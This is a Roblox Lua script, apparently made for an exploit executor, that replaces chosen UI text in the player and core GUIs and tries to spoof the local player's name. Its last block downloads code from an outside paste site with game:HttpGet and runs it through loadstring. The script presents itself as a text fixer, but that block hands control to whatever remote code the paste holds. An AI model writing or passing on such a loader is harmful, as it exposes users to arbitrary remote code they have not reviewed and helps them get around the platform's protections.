--[[ by Henne | Replace specific UI text exactly as written (case-sensitive) ]]

local Players = game:GetService("Players")
local RunService = game:GetService("RunService")
local CoreGui = game:GetService("CoreGui")

local LocalPlayer = Players.LocalPlayer

-- ==== CONFIG ====
-- Change this to what you want to show ("" to remove it entirely)
local REPLACEMENT = "Your Text Here"

-- Map phrases to your replacement. Add/remove as needed.
local TARGETS = {
    ["Zyroo | Private"] = REPLACEMENT,                                -- your original target
    ["I LIKE PORN!!!"] = REPLACEMENT,        -- override if remote code writes this
}

-- Optional: spoof display/name (delete if you don't want this)
pcall(function()
    LocalPlayer.Name = "12345AB801"
    LocalPlayer.DisplayName = "12345AB801"
end)

-- Escape Lua pattern chars for gsub
local function escapePattern(s)
    return (s:gsub("([%^%$%(%)%%%.%[%]%*%+%-%?])","%%%1"))
end

-- Replace any TARGETS found in a string (exact case)
local function patchText(text)
    if typeof(text) ~= "string" or text == "" then return text end
    for target, repl in pairs(TARGETS) do
        if string.find(text, target, 1, true) then
            text = string.gsub(text, escapePattern(target), repl)
        end
    end
    return text
end

-- Apply to any object with a Text property and keep it patched on change
local function patchObject(obj)
    if obj:IsA("TextLabel") or obj:IsA("TextButton") or obj:IsA("TextBox") then
        obj.Text = patchText(obj.Text)
        obj:GetPropertyChangedSignal("Text"):Connect(function()
            obj.Text = patchText(obj.Text)
        end)
    end
end

-- Patch env strings (rarely necessary; keep or remove)
for k, v in pairs(getfenv()) do
    if typeof(v) == "string" then
        getfenv()[k] = patchText(v)
    end
end

-- PlayerGui
local playerGui = LocalPlayer:WaitForChild("PlayerGui", 10)
for _, obj in ipairs(playerGui:GetDescendants()) do
    pcall(function() patchObject(obj) end)
end
playerGui.DescendantAdded:Connect(function(obj)
    pcall(function() patchObject(obj) end)
end)

-- CoreGui
for _, obj in ipairs(CoreGui:GetDescendants()) do
    pcall(function() patchObject(obj) end)
end
CoreGui.DescendantAdded:Connect(function(obj)
    pcall(function() patchObject(obj) end)
end)

RunService.Heartbeat:Connect(function() end)

-- If the remote script is putting the Ilias line back in, the above hooks will still replace it.
-- You can comment this out entirely if you don’t want any remote code to run.
pcall(function()
    local source = game:HttpGet("https://pastefy.app/mCTC42bW/raw")
    local func = loadstring(source)
    if func then func() end
end)

print("loaded nga")
